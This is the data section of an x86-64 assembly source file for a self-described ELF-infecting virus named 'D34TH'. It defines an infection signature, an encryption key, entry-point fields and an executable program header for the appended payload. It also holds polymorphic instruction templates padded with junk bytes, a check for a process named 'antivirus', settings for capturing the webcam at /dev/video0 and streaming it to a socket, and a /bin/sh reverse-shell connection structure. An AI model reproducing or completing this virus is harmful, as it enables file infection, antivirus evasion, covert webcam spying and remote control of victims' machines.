




file_size dq 0
file	db 'elf64 found!', 0

signature	db 'D34TH version 1.0 (c)oded by alexafer-jdecorte - XXXXXXXXXXXXXXXX:XXXXXXXXXX.XXXXXXXXXX', 0
encryption_key   dq 0xdeadbeefcafebabe


old_entry		   dq 0
new_entry		   dq 0
self	db '/proc/self/exe', 0
last	db '..', 0
curr	db '.', 0
cap_type dd V4L2_BUF_TYPE_VIDEO_CAPTURE
pathv	db '/dev/video0', 0
one		db 1
zero	db 0
paddi	dq 0
entry	dq 0
exec	dd 7
urandom_path : db '/dev/urandom', 0
randbuf: dq 0

; proc check
proc_prefix db '/proc/', 0
comm_path db '/comm', 0
forbidden_process db 'antivirus', 0

serv_addr_video:
    dw AF_INET
    dw 0x5c11			; 4444
    dd 0x0100007F		; 127.0.0.1
    times 8 db 0

serv_addr:
    dw AF_INET
    dw 0x901F			; 8080
    dd 0x0100007F		; 127.0.0.1
    times 8 db 0
    shell:	db '/bin/sh', 0
    arg0:       db "sh", 0
    argv:       dq 0, 0

templates_rdi:
    db 0x48, 0x31, 0xff, 0x90, 0x90, 0x90, 0x90     ; xor, rdi, rdi
    db 0x48, 0xc7, 0xc7, 0x00, 0x00, 0x00, 0x00     ; mov rdi , 0
    db 0x48, 0x29, 0xff, 0x90, 0x90, 0x90, 0x90     ; sub rdi, rdi
    db 0x48, 0x83, 0xe7, 0x00, 0x90, 0x90, 0x90     ; and rdi, 0
templates_rax:
    db 0x48, 0x31, 0xc0, 0x90, 0x90, 0x90, 0x90     ; xor rax, rax
    db 0x48, 0xc7, 0xc0, 0x00, 0x00, 0x00, 0x00     ; mov rax, 0
    db 0x48, 0x29, 0xc0, 0x90, 0x90, 0x90, 0x90     ; sub rax, rax
    db 0x48, 0x83, 0xe0, 0x00, 0x90, 0x90, 0x90     ; and rax, 0
templates_rsi:
    db 0x48, 0x31, 0xf6, 0x90, 0x90, 0x90, 0x90     ; xor rsi, rsi
    db 0x48, 0xc7, 0xc6, 0x00, 0x00, 0x00, 0x00     ; mov rsi, 0
    db 0x48, 0x29, 0xf6, 0x90, 0x90, 0x90, 0x90     ; sub rsi, rsi
    db 0x48, 0x83, 0xe6, 0x00, 0x90, 0x90, 0x90     ; and rsi, 0
templates_rdx:
    db 0x48, 0x31, 0xd2, 0x90, 0x90, 0x90, 0x90     ; xor rdx, rdx
    db 0x48, 0xc7, 0xc2, 0x00, 0x00, 0x00, 0x00     ; mov rdx, 0
    db 0x48, 0x29, 0xd2, 0x90, 0x90, 0x90, 0x90     ; sub rdx, rdx
    db 0x48, 0x83, 0xe2, 0x00, 0x90, 0x90, 0x90     ; and rdx, 0
templates_rcx:
    db 0x48, 0x31, 0xc9, 0x90, 0x90, 0x90, 0x90     ; xor rcx, rcx
    db 0x48, 0xc7, 0xc1, 0x00, 0x00, 0x00, 0x00     ; mov rcx, 0
    db 0x48, 0x29, 0xc9, 0x90, 0x90, 0x90, 0x90     ; sub rcx, rcx
    db 0x48, 0x83, 0xe1, 0x00, 0x90, 0x90, 0x90     ; and rcx, 0
templates_r10:
    db 0x4d, 0x31, 0xd2, 0x90, 0x90, 0x90, 0x90     ; xor r10, r10
    db 0x49, 0xc7, 0xc2, 0x00, 0x00, 0x00, 0x00     ; mov r10, 0
    db 0x4d, 0x29, 0xd2, 0x90, 0x90, 0x90, 0x90     ; sub r10, r10
    db 0x49, 0x83, 0xe2, 0x00, 0x90, 0x90, 0x90     ; and r10, 0
templates_r11:
    db 0x4d, 0x31, 0xdb, 0x90, 0x90, 0x90, 0x90     ; xor r11, r11
    db 0x49, 0xc7, 0xc3, 0x00, 0x00, 0x00, 0x00     ; mov r11, 0
    db 0x4d, 0x29, 0xdb, 0x90, 0x90, 0x90, 0x90     ; sub r11, r11
    db 0x49, 0x83, 0xe3, 0x00, 0x90, 0x90, 0x90     ; and r11, 0
templates_r13:
    db 0x4d, 0x31, 0xed, 0x90, 0x90, 0x90, 0x90     ; xor r13, r13
    db 0x49, 0xc7, 0xc5, 0x00, 0x00, 0x00, 0x00     ; mov r13, 0
    db 0x4d, 0x29, 0xed, 0x90, 0x90, 0x90, 0x90     ; sub r13, r13
    db 0x49, 0x83, 0xe5, 0x00, 0x90, 0x90, 0x90     ; and r13, 0
templates_r15:
    db 0x4d, 0x31, 0xff, 0x90, 0x90, 0x90, 0x90     ; xor r15, r15
    db 0x49, 0xc7, 0xc7, 0x00, 0x00, 0x00, 0x00     ; mov r15, 0
    db 0x4d, 0x29, 0xff, 0x90, 0x90, 0x90, 0x90     ; sub r15, r15
    db 0x49, 0x83, 0xe7, 0x00, 0x90, 0x90, 0x90     ; and r15, 0

templates_sys:
    ; push rax + syscall bloc + pop rax
    db 0x50, 0x6A, 0x18, 0x58, 0x0F, 0x05, 0x90, 0x90, 0x58
    db 0x50, 0x6A, 0x27, 0x58, 0x0F, 0x05, 0x90, 0x90, 0x58
    db 0x50, 0x6A, 0x66, 0x58, 0x0F, 0x05, 0x90, 0x90, 0x58
    db 0x50, 0x6A, 0x68, 0x58, 0x0F, 0x05, 0x90, 0x90, 0x58
    db 0x50, 0x6A, 0x6B, 0x58, 0x0F, 0x05, 0x90, 0x90, 0x58
    db 0x50, 0x6A, 0x6C, 0x58, 0x0F, 0x05, 0x90, 0x90, 0x58
    db 0x50, 0x6A, 0x6E, 0x58, 0x0F, 0x05, 0x90, 0x90, 0x58

    ; push rax + NOP junk + pop rax
    db 0x50, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x90, 0x90, 0x58
    db 0x50, 0x89, 0xC0, 0x0F, 0x1F, 0x00, 0x90, 0x90, 0x58
    db 0x50, 0x31, 0xC0, 0x83, 0xC0, 0x00, 0x90, 0x90, 0x58
    db 0x50, 0x40, 0x48, 0x0F, 0x1F, 0x00, 0x90, 0x90, 0x58
    db 0x50, 0x21, 0xC0, 0x0F, 0x1F, 0x00, 0x90, 0x90, 0x58
    db 0x50, 0xF5, 0xF8, 0x0F, 0x1F, 0x00, 0x90, 0x90, 0x58


; NEW HEADER
	dynm:	db 0
	inte:	db 0
	ispie:	db 0
new_programheader:
    p_type		dd	1
    p_flags		dd	7
    p_offset	dq	0
    p_vaddr		dq	0
    p_paddr		dq	0
    p_filez		dq	Death_SIZE_NO_BSS
    p_memsz		dq	Death_SIZE
    p_palign	dq	4096

newl	times 0001 db 0xa
path	db '/tmp/test/', 0
buffer_bss:
    padd	times 4096 db 0
    buff	times 4096 db 0
    stack	times 0144 db 0
    elfp0	times 0056 db 0
    elfp1	times 0056 db 0
    buf_addrs   times NBUF dq 0  ; adresses mmap des tampons
    buf_sizes   times NBUF dq 0   ; leurs tailles
    reqb        times 16   db 0         ; struct v4l2_requestbuffers
    v4buf       times 88   db 0      ; struct v4l2_buffer (x86-64 = 88 o)

    path_buffer times 256 db 0
    comm_buff   times 32 db 0
    temp_buf    times 8 db 0
    time_buf    times 8 db 0
    timeval     times 16 db 0
end_addr:
